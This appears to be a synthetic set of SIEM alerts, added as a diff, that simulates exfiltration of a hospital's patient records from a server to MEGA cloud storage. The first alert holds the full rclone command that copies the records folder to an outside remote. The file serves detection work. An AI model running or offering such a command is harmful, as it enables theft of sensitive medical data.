@@ -1,0 +1,135 @@
+[
+  {
+    "id": "scn-exfil-0001",
+    "timestamp": "2026-11-07T22:47:18.000+0000",
+    "rule": {
+      "id": "92412",
+      "level": 13,
+      "description": "rclone used to copy the patient records folder to cloud storage.",
+      "groups": [
+        "windows",
+        "sysmon",
+        "sysmon_eid1_detections"
+      ],
+      "mitre": {
+        "id": [
+          "T1567.002"
+        ],
+        "technique": [
+          "Exfiltration to Cloud Storage"
+        ]
+      }
+    },
+    "agent": {
+      "id": "018",
+      "name": "RECORDS-SRV",
+      "ip": "10.0.1.21"
+    },
+    "data": {
+      "win": {
+        "system": {
+          "eventID": "1",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "computer": "RECORDS-SRV"
+        },
+        "eventdata": {
+          "image": "C:\\Users\\Administrator\\Downloads\\rclone.exe",
+          "commandLine": "rclone.exe copy D:\\PatientRecords mega:bk --transfers 16 --ignore-existing -q",
+          "parentImage": "C:\\Windows\\System32\\cmd.exe",
+          "user": "NORTHFIELD\\Administrator",
+          "integrityLevel": "High"
+        }
+      }
+    },
+    "location": "EventChannel"
+  },
+  {
+    "id": "scn-exfil-0002",
+    "timestamp": "2026-11-07T22:47:20.000+0000",
+    "rule": {
+      "id": "92101",
+      "level": 10,
+      "description": "Outbound connection to a cloud storage service.",
+      "groups": [
+        "windows",
+        "sysmon",
+        "sysmon_eid3_detections"
+      ],
+      "mitre": {
+        "id": [
+          "T1567.002"
+        ],
+        "technique": [
+          "Exfiltration to Cloud Storage"
+        ]
+      }
+    },
+    "agent": {
+      "id": "018",
+      "name": "RECORDS-SRV",
+      "ip": "10.0.1.21"
+    },
+    "data": {
+      "win": {
+        "system": {
+          "eventID": "3",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "computer": "RECORDS-SRV"
+        },
+        "eventdata": {
+          "image": "C:\\Users\\Administrator\\Downloads\\rclone.exe",
+          "protocol": "tcp",
+          "destinationHostname": "g.api.mega.co.nz",
+          "destinationPort": "443",
+          "sourceIp": "10.0.1.21"
+        }
+      }
+    },
+    "location": "EventChannel"
+  },
+  {
+    "id": "scn-exfil-0003",
+    "timestamp": "2026-11-07T22:58:40.000+0000",
+    "rule": {
+      "id": "100410",
+      "level": 14,
+      "description": "Large outbound transfer: 4.2 GB sent to cloud storage in 11 minutes from RECORDS-SRV.",
+      "groups": [
+        "windows",
+        "sysmon",
+        "exfiltration"
+      ],
+      "mitre": {
+        "id": [
+          "T1567.002",
+          "T1048"
+        ],
+        "technique": [
+          "Exfiltration to Cloud Storage",
+          "Exfiltration Over Alternative Protocol"
+        ]
+      }
+    },
+    "agent": {
+      "id": "018",
+      "name": "RECORDS-SRV",
+      "ip": "10.0.1.21"
+    },
+    "data": {
+      "win": {
+        "system": {
+          "eventID": "3",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "computer": "RECORDS-SRV"
+        },
+        "eventdata": {
+          "image": "C:\\Users\\Administrator\\Downloads\\rclone.exe",
+          "destinationHostname": "g.api.mega.co.nz",
+          "bytesSent": "4509715660",
+          "durationSeconds": "682"
+        }
+      }
+    },
+    "location": "EventChannel"
+  }
+]
